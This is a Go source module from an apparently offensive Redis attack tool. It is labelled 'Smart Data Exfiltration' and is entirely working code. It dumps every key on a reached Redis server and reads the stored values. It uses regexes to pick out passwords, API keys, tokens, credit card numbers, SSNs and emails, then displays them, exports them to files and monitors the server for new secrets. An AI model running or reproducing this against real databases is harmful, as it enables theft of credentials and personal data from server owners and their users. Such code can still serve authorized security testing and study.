package analysis

import (
	"0xRedisis/modules/core"
	"bufio"
	"encoding/json"
	"fmt"
	"os"
	"regexp"
	"strconv"
	"strings"
	"time"
)

type KeyInfo struct {
	Name      string `json:"name"`
	Type      string `json:"type"`
	Size      int64  `json:"size"`
	TTL       int64  `json:"ttl"`
	Value     string `json:"value,omitempty"`
	Sensitive bool   `json:"sensitive"`
}

type ExfiltrationReport struct {
	Timestamp     time.Time `json:"timestamp"`
	Host          string    `json:"host"`
	Port          int       `json:"port"`
	TotalKeys     int       `json:"total_keys"`
	SensitiveKeys int       `json:"sensitive_keys"`
	Keys          []KeyInfo `json:"keys"`
}

func SmartDataExfiltration(client *core.RedisClient) {
	fmt.Printf("\n%s=== Smart Data Exfiltration ===%s\n", core.ColorBlue, core.ColorNC)

	// Show exfiltration options
	fmt.Printf("\n%s[*]%s Data Exfiltration Options:\n", core.ColorBlue, core.ColorNC)
	fmt.Printf("%s1.%s Quick sensitive data scan\n", core.ColorYellow, core.ColorNC)
	fmt.Printf("%s2.%s Full database enumeration\n", core.ColorYellow, core.ColorNC)
	fmt.Printf("%s3.%s Pattern-based key search\n", core.ColorYellow, core.ColorNC)
	fmt.Printf("%s4.%s Export data to file\n", core.ColorYellow, core.ColorNC)
	fmt.Printf("%s5.%s Real-time key monitoring\n", core.ColorYellow, core.ColorNC)
	fmt.Print("\nEnter your choice (1-5): ")

	reader := bufio.NewReader(os.Stdin)
	choice, _ := reader.ReadString('\n')
	choice = strings.TrimSpace(choice)

	switch choice {
	case "1":
		quickSensitiveScan(client)
	case "2":
		fullDatabaseEnumeration(client, reader)
	case "3":
		patternBasedSearch(client, reader)
	case "4":
		exportDataToFile(client, reader)
	case "5":
		realTimeKeyMonitoring(client, reader)
	default:
		fmt.Printf("%s[-]%s Invalid choice\n", core.ColorRed, core.ColorNC)
	}
}

func quickSensitiveScan(client *core.RedisClient) {
	fmt.Printf("\n%s=== Quick Sensitive Data Scan ===%s\n", core.ColorBlue, core.ColorNC)

	// Patterns to look for sensitive data
	sensitivePatterns := []struct {
		name    string
		pattern string
	}{
		{"Password", `(?i)(password|pwd|pass|secret)`},
		{"API Key", `(?i)(api[_-]?key|apikey|access[_-]?key)`},
		{"Token", `(?i)(token|jwt|auth)`},
		{"Email", `[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}`},
		{"Credit Card", `\b\d{4}[-\s]?\d{4}[-\s]?\d{4}[-\s]?\d{4}\b`},
		{"SSN", `\b\d{3}-\d{2}-\d{4}\b`},
		{"Phone", `\b\d{3}[-.]?\d{3}[-.]?\d{4}\b`},
		{"IP Address", `\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b`},
	}

	fmt.Printf("%s[*]%s Scanning for sensitive data patterns...\n", core.ColorBlue, core.ColorNC)

	// Get all keys
	keys, err := getAllKeys(client)
	if err != nil {
		fmt.Printf("%s[-]%s Failed to get keys: %s\n", core.ColorRed, core.ColorNC, err.Error())
		return
	}

	sensitiveKeys := []KeyInfo{}

	for _, key := range keys {
		keyInfo := analyzeKey(client, key, sensitivePatterns)
		if keyInfo.Sensitive {
			sensitiveKeys = append(sensitiveKeys, keyInfo)
		}
	}

	// Display results
	fmt.Printf("\n%s[+]%s Found %d sensitive keys out of %d total keys\n",
		core.ColorGreen, core.ColorNC, len(sensitiveKeys), len(keys))

	if len(sensitiveKeys) > 0 {
		fmt.Printf("\n%s=== Sensitive Keys Found ===%s\n", core.ColorYellow, core.ColorNC)
		for i, keyInfo := range sensitiveKeys {
			if i >= 10 { // Limit display to first 10
				fmt.Printf("%s[*]%s ... and %d more keys\n",
					core.ColorBlue, core.ColorNC, len(sensitiveKeys)-10)
				break
			}

			fmt.Printf("%s[%d]%s Key: %s%s%s\n",
				core.ColorYellow, i+1, core.ColorNC, core.ColorYellow, keyInfo.Name, core.ColorNC)
			fmt.Printf("     Type: %s, Size: %d bytes, TTL: %d\n",
				keyInfo.Type, keyInfo.Size, keyInfo.TTL)

			if len(keyInfo.Value) > 100 {
				fmt.Printf("     Value: %s%s...%s\n",
					core.ColorGreen, keyInfo.Value[:100], core.ColorNC)
			} else {
				fmt.Printf("     Value: %s%s%s\n",
					core.ColorGreen, keyInfo.Value, core.ColorNC)
			}
			fmt.Println()
		}
	}
}

func fullDatabaseEnumeration(client *core.RedisClient, reader *bufio.Reader) {
	fmt.Printf("\n%s=== Full Database Enumeration ===%s\n", core.ColorBlue, core.ColorNC)

	fmt.Print("Enter maximum keys to enumerate (0 for all): ")
	maxKeysStr, _ := reader.ReadString('\n')
	maxKeys, _ := strconv.Atoi(strings.TrimSpace(maxKeysStr))

	keys, err := getAllKeys(client)
	if err != nil {
		fmt.Printf("%s[-]%s Failed to get keys: %s\n", core.ColorRed, core.ColorNC, err.Error())
		return
	}

	fmt.Printf("%s[*]%s Found %d keys total\n", core.ColorBlue, core.ColorNC, len(keys))

	if maxKeys > 0 && maxKeys < len(keys) {
		keys = keys[:maxKeys]
		fmt.Printf("%s[*]%s Limiting enumeration to %d keys\n", core.ColorBlue, core.ColorNC, maxKeys)
	}

	report := ExfiltrationReport{
		Timestamp: time.Now(),
		Host:      client.Config.Host,
		Port:      client.Config.Port,
		TotalKeys: len(keys),
		Keys:      []KeyInfo{},
	}

	fmt.Printf("%s[*]%s Enumerating keys...\n", core.ColorBlue, core.ColorNC)

	for i, key := range keys {
		if i%10 == 0 {
			fmt.Printf("\r%s[*]%s Progress: %d/%d",
				core.ColorBlue, core.ColorNC, i, len(keys))
		}

		keyInfo := analyzeKey(client, key, nil)
		report.Keys = append(report.Keys, keyInfo)

		if keyInfo.Sensitive {
			report.SensitiveKeys++
		}
	}

	fmt.Printf("\r%s[+]%s Enumeration complete: %d keys processed\n",
		core.ColorGreen, core.ColorNC, len(keys))
	fmt.Printf("%s[+]%s Sensitive keys found: %d\n",
		core.ColorGreen, core.ColorNC, report.SensitiveKeys)

	// Ask if user wants to save report
	fmt.Print("\nSave detailed report to file? (y/n): ")
	save, _ := reader.ReadString('\n')
	if strings.ToLower(strings.TrimSpace(save)) == "y" {
		saveExfiltrationReport(report)
	}
}

func patternBasedSearch(client *core.RedisClient, reader *bufio.Reader) {
	fmt.Printf("\n%s=== Pattern-Based Key Search ===%s\n", core.ColorBlue, core.ColorNC)

	fmt.Printf("%s[*]%s Search Options:\n", core.ColorBlue, core.ColorNC)
	fmt.Printf("%s1.%s Key name pattern\n", core.ColorYellow, core.ColorNC)
	fmt.Printf("%s2.%s Value content pattern\n", core.ColorYellow, core.ColorNC)
	fmt.Printf("%s3.%s Both key and value\n", core.ColorYellow, core.ColorNC)
	fmt.Print("\nEnter your choice (1-3): ")

	choice, _ := reader.ReadString('\n')
	choice = strings.TrimSpace(choice)

	var keyPattern, valuePattern string

	if choice == "1" || choice == "3" {
		fmt.Print("Enter key name pattern (regex): ")
		keyPattern, _ = reader.ReadString('\n')
		keyPattern = strings.TrimSpace(keyPattern)
	}

	if choice == "2" || choice == "3" {
		fmt.Print("Enter value content pattern (regex): ")
		valuePattern, _ = reader.ReadString('\n')
		valuePattern = strings.TrimSpace(valuePattern)
	}

	keys, err := getAllKeys(client)
	if err != nil {
		fmt.Printf("%s[-]%s Failed to get keys: %s\n", core.ColorRed, core.ColorNC, err.Error())
		return
	}

	var keyRegex, valueRegex *regexp.Regexp
	if keyPattern != "" {
		keyRegex, err = regexp.Compile(keyPattern)
		if err != nil {
			fmt.Printf("%s[-]%s Invalid key pattern: %s\n", core.ColorRed, core.ColorNC, err.Error())
			return
		}
	}

	if valuePattern != "" {
		valueRegex, err = regexp.Compile(valuePattern)
		if err != nil {
			fmt.Printf("%s[-]%s Invalid value pattern: %s\n", core.ColorRed, core.ColorNC, err.Error())
			return
		}
	}

	matchingKeys := []KeyInfo{}

	fmt.Printf("%s[*]%s Searching through %d keys...\n", core.ColorBlue, core.ColorNC, len(keys))

	for _, key := range keys {
		keyMatch := keyRegex == nil || keyRegex.MatchString(key)

		if keyMatch {
			keyInfo := analyzeKey(client, key, nil)
			valueMatch := valueRegex == nil || valueRegex.MatchString(keyInfo.Value)

			if valueMatch {
				matchingKeys = append(matchingKeys, keyInfo)
			}
		}
	}

	fmt.Printf("%s[+]%s Found %d matching keys\n", core.ColorGreen, core.ColorNC, len(matchingKeys))

	// Display results
	for i, keyInfo := range matchingKeys {
		if i >= 20 { // Limit to 20 results
			fmt.Printf("%s[*]%s ... and %d more matches\n",
				core.ColorBlue, core.ColorNC, len(matchingKeys)-20)
			break
		}

		fmt.Printf("\n%s[%d]%s %s%s%s\n",
			core.ColorYellow, i+1, core.ColorNC, core.ColorYellow, keyInfo.Name, core.ColorNC)
		fmt.Printf("     Type: %s, Size: %d\n", keyInfo.Type, keyInfo.Size)

		if len(keyInfo.Value) > 200 {
			fmt.Printf("     Value: %s%s...%s\n",
				core.ColorGreen, keyInfo.Value[:200], core.ColorNC)
		} else {
			fmt.Printf("     Value: %s%s%s\n",
				core.ColorGreen, keyInfo.Value, core.ColorNC)
		}
	}
}

func exportDataToFile(client *core.RedisClient, reader *bufio.Reader) {
	fmt.Printf("\n%s=== Export Data to File ===%s\n", core.ColorBlue, core.ColorNC)

	fmt.Printf("%s[*]%s Export Formats:\n", core.ColorBlue, core.ColorNC)
	fmt.Printf("%s1.%s JSON\n", core.ColorYellow, core.ColorNC)
	fmt.Printf("%s2.%s CSV\n", core.ColorYellow, core.ColorNC)
	fmt.Printf("%s3.%s Plain text\n", core.ColorYellow, core.ColorNC)
	fmt.Print("\nEnter format choice (1-3): ")

	formatChoice, _ := reader.ReadString('\n')
	formatChoice = strings.TrimSpace(formatChoice)

	fmt.Print("Export all keys or only sensitive ones? (all/sensitive): ")
	scope, _ := reader.ReadString('\n')
	scope = strings.TrimSpace(strings.ToLower(scope))

	keys, err := getAllKeys(client)
	if err != nil {
		fmt.Printf("%s[-]%s Failed to get keys: %s\n", core.ColorRed, core.ColorNC, err.Error())
		return
	}

	// Analyze keys
	sensitivePatterns := []struct {
		name    string
		pattern string
	}{
		{"Password", `(?i)(password|pwd|pass|secret)`},
		{"API Key", `(?i)(api[_-]?key|apikey|access[_-]?key)`},
		{"Token", `(?i)(token|jwt|auth)`},
		{"Email", `[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}`},
	}

	var keysToExport []KeyInfo
	for _, key := range keys {
		keyInfo := analyzeKey(client, key, sensitivePatterns)
		if scope == "all" || keyInfo.Sensitive {
			keysToExport = append(keysToExport, keyInfo)
		}
	}

	timestamp := time.Now().Format("20060102_150405")
	var filename string
	var content string

	switch formatChoice {
	case "1":
		filename = fmt.Sprintf("redis_export_%s.json", timestamp)
		report := ExfiltrationReport{
			Timestamp:     time.Now(),
			Host:          client.Config.Host,
			Port:          client.Config.Port,
			TotalKeys:     len(keysToExport),
			SensitiveKeys: countSensitiveKeys(keysToExport),
			Keys:          keysToExport,
		}
		jsonData, _ := json.MarshalIndent(report, "", "  ")
		content = string(jsonData)
	case "2":
		filename = fmt.Sprintf("redis_export_%s.csv", timestamp)
		content = "Name,Type,Size,TTL,Sensitive,Value\n"
		for _, keyInfo := range keysToExport {
			escapedValue := strings.ReplaceAll(keyInfo.Value, "\"", "\"\"")
			content += fmt.Sprintf("\"%s\",\"%s\",%d,%d,%t,\"%s\"\n",
				keyInfo.Name, keyInfo.Type, keyInfo.Size, keyInfo.TTL, keyInfo.Sensitive, escapedValue)
		}
	case "3":
		filename = fmt.Sprintf("redis_export_%s.txt", timestamp)
		content = fmt.Sprintf("Redis Export Report\nHost: %s:%d\nTimestamp: %s\n\n",
			client.Config.Host, client.Config.Port, time.Now().Format(time.RFC3339))
		for i, keyInfo := range keysToExport {
			content += fmt.Sprintf("[%d] %s\n", i+1, keyInfo.Name)
			content += fmt.Sprintf("    Type: %s, Size: %d, TTL: %d\n", keyInfo.Type, keyInfo.Size, keyInfo.TTL)
			content += fmt.Sprintf("    Value: %s\n\n", keyInfo.Value)
		}
	}

	err = os.WriteFile(filename, []byte(content), 0644)
	if err != nil {
		fmt.Printf("%s[-]%s Failed to write file: %s\n", core.ColorRed, core.ColorNC, err.Error())
		return
	}

	fmt.Printf("%s[+]%s Data exported to: %s%s%s\n",
		core.ColorGreen, core.ColorNC, core.ColorYellow, filename, core.ColorNC)
	fmt.Printf("%s[+]%s Exported %d keys\n", core.ColorGreen, core.ColorNC, len(keysToExport))
}

func realTimeKeyMonitoring(client *core.RedisClient, reader *bufio.Reader) {
	fmt.Printf("\n%s=== Real-Time Key Monitoring ===%s\n", core.ColorBlue, core.ColorNC)

	fmt.Print("Enter monitoring duration in seconds (0 for infinite): ")
	durationStr, _ := reader.ReadString('\n')
	duration, _ := strconv.Atoi(strings.TrimSpace(durationStr))

	// Get initial key set
	initialKeys, err := getAllKeys(client)
	if err != nil {
		fmt.Printf("%s[-]%s Failed to get initial keys: %s\n", core.ColorRed, core.ColorNC, err.Error())
		return
	}

	fmt.Printf("%s[*]%s Starting monitoring with %d initial keys...\n",
		core.ColorBlue, core.ColorNC, len(initialKeys))
	fmt.Printf("%s[*]%s Press Ctrl+C to stop\n", core.ColorBlue, core.ColorNC)

	keyMap := make(map[string]bool)
	for _, key := range initialKeys {
		keyMap[key] = true
	}

	startTime := time.Now()
	ticker := time.NewTicker(2 * time.Second)
	defer ticker.Stop()

	for {
		select {
		case <-ticker.C:
			currentKeys, err := getAllKeys(client)
			if err != nil {
				continue
			}

			// Check for new keys
			for _, key := range currentKeys {
				if !keyMap[key] {
					fmt.Printf("%s[+]%s New key detected: %s%s%s\n",
						core.ColorGreen, core.ColorNC, core.ColorYellow, key, core.ColorNC)
					keyInfo := analyzeKey(client, key, nil)
					if keyInfo.Sensitive {
						fmt.Printf("     %s[!] SENSITIVE DATA DETECTED%s\n", core.ColorRed, core.ColorNC)
					}
					keyMap[key] = true
				}
			}

			// Check for deleted keys
			currentKeyMap := make(map[string]bool)
			for _, key := range currentKeys {
				currentKeyMap[key] = true
			}

			for key := range keyMap {
				if !currentKeyMap[key] {
					fmt.Printf("%s[-]%s Key deleted: %s%s%s\n",
						core.ColorRed, core.ColorNC, core.ColorYellow, key, core.ColorNC)
					delete(keyMap, key)
				}
			}

			// Check duration
			if duration > 0 && time.Since(startTime).Seconds() > float64(duration) {
				fmt.Printf("\n%s[*]%s Monitoring completed\n", core.ColorBlue, core.ColorNC)
				return
			}

		default:
			// Check if user wants to quit
			time.Sleep(100 * time.Millisecond)
		}
	}
}

// Helper functions
func getAllKeys(client *core.RedisClient) ([]string, error) {
	result, err := client.SendCommand("KEYS", "*")
	if err != nil {
		return nil, err
	}

	// Parse the array response
	lines := strings.Split(result, "\n")
	var keys []string

	for _, line := range lines {
		line = strings.TrimSpace(line)
		if line != "" && !strings.HasPrefix(line, "*") && !strings.HasPrefix(line, "$") {
			keys = append(keys, line)
		}
	}

	return keys, nil
}

func analyzeKey(client *core.RedisClient, key string, patterns []struct{ name, pattern string }) KeyInfo {
	keyInfo := KeyInfo{
		Name: key,
		TTL:  -1,
	}

	// Get key type
	keyType, err := client.SendCommand("TYPE", key)
	if err == nil {
		keyInfo.Type = strings.TrimSpace(strings.ReplaceAll(keyType, "+", ""))
	}

	// Get key size
	switch keyInfo.Type {
	case "string":
		size, err := client.SendCommand("STRLEN", key)
		if err == nil {
			keyInfo.Size, _ = strconv.ParseInt(strings.TrimSpace(size), 10, 64)
		}
		// Get string value
		value, err := client.SendCommand("GET", key)
		if err == nil {
			keyInfo.Value = strings.TrimSpace(value)
		}
	case "list":
		size, err := client.SendCommand("LLEN", key)
		if err == nil {
			keyInfo.Size, _ = strconv.ParseInt(strings.TrimSpace(size), 10, 64)
		}
	case "set":
		size, err := client.SendCommand("SCARD", key)
		if err == nil {
			keyInfo.Size, _ = strconv.ParseInt(strings.TrimSpace(size), 10, 64)
		}
	case "hash":
		size, err := client.SendCommand("HLEN", key)
		if err == nil {
			keyInfo.Size, _ = strconv.ParseInt(strings.TrimSpace(size), 10, 64)
		}
	}

	// Get TTL
	ttl, err := client.SendCommand("TTL", key)
	if err == nil {
		keyInfo.TTL, _ = strconv.ParseInt(strings.TrimSpace(ttl), 10, 64)
	}

	// Check for sensitive patterns
	if patterns != nil {
		for _, pattern := range patterns {
			matched, _ := regexp.MatchString(pattern.pattern, key+" "+keyInfo.Value)
			if matched {
				keyInfo.Sensitive = true
				break
			}
		}
	}

	return keyInfo
}

func countSensitiveKeys(keys []KeyInfo) int {
	count := 0
	for _, key := range keys {
		if key.Sensitive {
			count++
		}
	}
	return count
}

func saveExfiltrationReport(report ExfiltrationReport) {
	timestamp := time.Now().Format("20060102_150405")
	filename := fmt.Sprintf("exfiltration_report_%s.json", timestamp)

	jsonData, err := json.MarshalIndent(report, "", "  ")
	if err != nil {
		fmt.Printf("%s[-]%s Failed to marshal report: %s\n", core.ColorRed, core.ColorNC, err.Error())
		return
	}

	err = os.WriteFile(filename, jsonData, 0644)
	if err != nil {
		fmt.Printf("%s[-]%s Failed to save report: %s\n", core.ColorRed, core.ColorNC, err.Error())
		return
	}

	fmt.Printf("%s[+]%s Report saved to: %s%s%s\n",
		core.ColorGreen, core.ColorNC, core.ColorYellow, filename, core.ColorNC)
}
